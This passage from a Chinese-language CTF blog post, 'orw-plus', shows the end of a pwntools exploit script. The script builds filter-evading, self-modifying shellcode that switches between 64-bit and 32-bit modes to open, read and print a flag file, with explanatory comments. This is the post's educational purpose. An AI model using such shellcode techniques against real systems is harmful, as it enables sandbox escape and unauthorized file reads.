</span></span><span style=display:flex><span>p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>&#34;shellcode: &#34;</span>)
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#一直用rbx存储mmap返回的地址</span>
</span></span><span style=display:flex><span>append_x86 <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>push ebx
</span></span></span><span style=display:flex><span><span style=color:#b44>pop ebx
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>append <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>push rdx
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rdx
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># 0x40404040 为32位shellcode地址</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#len=0x31，相当于在这个shellcode_mmap后面加上一个\x0f\x05,执行syscall，注意从0开始,[rbx+0x31],[rbx+0x32]为syscall</span>
</span></span><span style=display:flex><span>shellcode_mmap <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>/*mmap(0x40404040,0x7e,7,34,0,0)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40404040 /*set rdi*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rdi
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x7e /*set rsi*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rsi
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40 /*set rdx*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x47
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rdx
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40 /*set r8*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x40
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax
</span></span></span><span style=display:flex><span><span style=color:#b44>pop r8
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax /*set r9*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop r9
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>/*syscall rbx为mmap的返回的地址*/
</span></span></span><span style=display:flex><span><span style=color:#b44>push rbx
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x5d
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x31],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x5f
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x32],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x22 /*set rcx*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40/*set rax*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x49
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#len=0x24,[rbx+0x57],[rbx+0x58]为syscall</span>
</span></span><span style=display:flex><span>shellcode_read <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>/*read(0,0x40404040,0x70) rax=rbx,先xor 0x5d,再xor 0x5f*/
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40404040 /*set rsi*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rsi
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40       /*set rdi*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x40
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rdi
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x40     /*set rdx*/
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x70
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rdx
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push rbx        /*构造syscall*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x5d
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x57],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x5f
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x58],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push rdx        /*set rax=0*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x70
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#len=0x27 0x52^0x72^0x68=0x48 byte 0x5a-0x47-0x48=0xcb 刚好让[rbx+0x80][rbx+0x81]为\x48\xcb，retfq的机械码</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#这里不能直接用retfq，因为\xcb会通不过check检查</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#这是别的师傅的wp，这里最后面的push rdi, pop rax,push rax其实都没什么用，可以删掉，但是要注意重新调整[rax+...]里面的内容凑出retfq</span>
</span></span><span style=display:flex><span>shellcode_retfq <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>push rbx
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax
</span></span></span><span style=display:flex><span><span style=color:#b44>xor al,0x40  /*rax现在的值为mmap返回的地址但是最低一个字节为0x40*/
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x72    /*让[rbx+0x80],[rbx+0x81]变成retfq*/
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x40],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x68
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor byte ptr[rax+0x40],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x47
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>sub byte ptr[rax+0x41],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x48
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>sub byte ptr[rax+0x41],cl
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>push rdi   /*凑代码长度，同时设置0x23,0x40404040的值,rax也等于0x40404040*/
</span></span></span><span style=display:flex><span><span style=color:#b44>push rdi
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x23
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40404040
</span></span></span><span style=display:flex><span><span style=color:#b44>pop rax    
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#注意在64位下的retfq让rip=0x40404040</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#esp先指向一个合理的可以被32位解析的地方,这里是0x40404040+0x100，ebx=flag的地址，ecx=0,eax=5(32位下open系统调用号)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#len=0x17</span>
</span></span><span style=display:flex><span>shellcode_x86 <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>/*fp = open(&#34;flag&#34;)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov esp,0x40404140
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x67616c66  
</span></span></span><span style=display:flex><span><span style=color:#b44>push esp
</span></span></span><span style=display:flex><span><span style=color:#b44>pop ebx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor ecx,ecx
</span></span></span><span style=display:flex><span><span style=color:#b44>mov eax,5
</span></span></span><span style=display:flex><span><span style=color:#b44>int 0x80
</span></span></span><span style=display:flex><span><span style=color:#b44>mov ecx,eax
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#注意使用了ecx存储了open函数的返回值，才有mov rdi,rcx</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#rip=0x40404089,cs=0x33，进入64位模式，执行read函数和write函数</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#len=0x2b push 0x33 push 0x40404089 retfq指令长度为0x9</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#0x17+0x29+0x9=0x49,所以nop数量为0x29,rip=0x40404089接着执行read</span>
</span></span><span style=display:flex><span>shellcode_flag <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x33
</span></span></span><span style=display:flex><span><span style=color:#b44>push 0x40404089
</span></span></span><span style=display:flex><span><span style=color:#b44>retfq
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>/*read(fp,buf,0x70)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdi,rcx
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rsi,rsp     /*rsi只要是个可写的地址就行,这里直接用rsp指向的位置最方便*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdx,0x70
</span></span></span><span style=display:flex><span><span style=color:#b44>xor rax,rax
</span></span></span><span style=display:flex><span><span style=color:#b44>syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>/*write(1,buf,0x70)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdi,1
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rax,1
</span></span></span><span style=display:flex><span><span style=color:#b44>syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#append指令是为了给syscall占位置,append的机械码 &#34;\x52\x5a&#34;  0x52^0x5d=0xf 0x5a^0x5f=0x5</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> shellcode_mmap
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> append
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> shellcode_read
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> append
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> shellcode_retfq
</span></span><span style=display:flex><span>shellcode <span style=color:#666>+=</span> append
</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> asm(shellcode,arch <span style=color:#666>=</span> <span style=color:#b44>&#39;amd64&#39;</span>,os <span style=color:#666>=</span> <span style=color:#b44>&#39;linux&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(shellcode)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shellcode_x86 <span style=color:#666>=</span> asm(shellcode_x86)
</span></span><span style=display:flex><span>shellcode_flag <span style=color:#666>=</span> asm(shellcode_flag,arch <span style=color:#666>=</span> <span style=color:#b44>&#39;amd64&#39;</span>,os <span style=color:#666>=</span> <span style=color:#b44>&#39;linux&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(shellcode_x86 <span style=color:#666>+</span> <span style=color:#666>0x29</span><span style=color:#666>*</span><span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x90</span><span style=color:#b44>&#39;</span> <span style=color:#666>+</span> shellcode_flag)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
</span></span></code></pre></div></div><footer class=post-footer><div class=post-tags><a href=/tags/orw-plus>orw-plus</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
orw-plus</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://zp9080.github.io/post/shellcode/orw-plus/ title=orw-plus>https://zp9080.github.io/post/shellcode/orw-plus/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/stackoverflow/one_gadget/ rel=next title=one_gadget><i class="fa fa-chevron-left"></i> one_gadget</a></div><div class="post-nav-prev post-nav-item"><a href=/post/%E5%A0%86%E6%9D%82%E8%AE%B0/partial-overwrite/ rel=prev title="partial overwrite">partial overwrite
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>